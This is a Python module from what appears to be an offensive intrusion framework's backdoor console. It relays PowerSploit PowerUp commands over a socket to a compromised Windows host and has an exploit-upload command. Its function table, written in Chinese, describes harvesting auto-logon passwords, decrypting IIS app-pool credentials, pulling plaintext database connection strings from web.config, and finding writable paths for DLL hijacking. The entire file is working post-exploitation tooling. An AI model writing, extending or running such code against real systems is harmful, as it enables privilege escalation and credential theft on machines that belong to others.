import os
import sys
import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from AuxiliaryFunctions import MyTable
from AuxiliaryFunctions import uploadCVE


class PowerUp:
    def __init__(self, conn):
        commands = ["back", "upload PowerUp.ps1", "show functions"]
        completer = WordCompleter(commands)
        formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Privilege Elevation ~ PowerUp ] \033[0m')
        history = InMemoryHistory()
        while True:
            try:
                choice = prompt(formatted_text1, completer=completer, history=history)
                if choice.lower() == 'show functions':
                    self.show_functions()
                    continue
                elif choice == 'back':
                    break
                elif choice == "":
                    continue
                elif choice.split()[0] == 'upload':
                    uploadCVE.uploadCVE(conn, choice)
                    continue
                elif choice == '1':
                    command = "powersploit Find-PathDLLHijack"
                    self.receive(conn, command)
                    continue
                elif choice == '2':
                    command = "powersploit Get-ApplicationHost"
                    self.receive(conn, command)
                    continue
                elif choice == '3':
                    command = "powersploit Get-RegistryAlwaysInstallElevated"
                    self.receive(conn, command)
                    continue
                elif choice == '4':
                    command = "powersploit Get-RegistryAutoLogon"
                    self.receive(conn, command)
                    continue
                elif choice == '5':
                    command = "powersploit Get-UnattendedInstallFile"
                    self.receive(conn, command)
                    continue
                elif choice == '6':
                    command = "powersploit Get-ModifiableRegistryAutoRun"
                    self.receive(conn, command)
                    continue
                elif choice == '7':
                    command = "powersploit Get-ModifiableScheduledTaskFile"
                    self.receive(conn, command)
                    continue
                elif choice == '8':
                    command = "powersploit Get-Webconfig"
                    self.receive(conn, command)
                    continue
            except KeyboardInterrupt:
                print("exiting......")
                break
            except:
                continue

    def show_functions(self):
        print("\n" + '\033[1;34;34m' + "PowerUp" + '\033[0m' + "\n" + '=' * len("PowerUp") + "\n")
        headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
        mydata = [["1", "Find-PathDLLHijack", "1", "检查当前%PATH%是否存在当前用户可以写入的目录"],
                  ["2", "Get-ApplicationHost", "2", "从系统上的applicationHost.config文件恢复加密过的应用池和虚拟目录的密码"],
                  ["3", "Get-RegistryAlwaysInstallElevated", "3", "检查AlwaysInstallElevated注册表项是否被设置，如果被设置，意味着的MSI文件是以system权限运行的"],
                  ["4", "Get-RegistryAutoLogon", "4", "检测Winlogin注册表AutoAdminLogon项有没有被设置，可查询默认的用户名和密码"],
                  ["5", "Get-UnattendedInstallFile", "5", "查找可能包含有部署凭据的文件"],
                  ["6", "Get-ModifiableRegistryAutoRun", "6", "检查开机自启的应用程序路径和注册表键值，返回当前用户可修改的程序路径"],
                  ["7", "Get-ModifiableScheduledTaskFile", "7", "返回当前用户能够修改的计划任务程序的名称和路径"],
                  ["8", "Get-Webconfig", "8", "返回当前服务器上的web.config文件中的数据库连接字符串的明文"]]
        MyTable.createTable(headers, mydata)

    def receive(self, conn, command):
        conn.sendall(command.encode("gbk"))
        result_len = conn.recv(4)
        real_len = struct.unpack("i", result_len)[0]
        while True:
            if 1024 < real_len:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                real_len = real_len - 1024
                continue
            else:
                result = conn.recv(1024).decode("gbk", errors="ignore")
                print(result)
                break
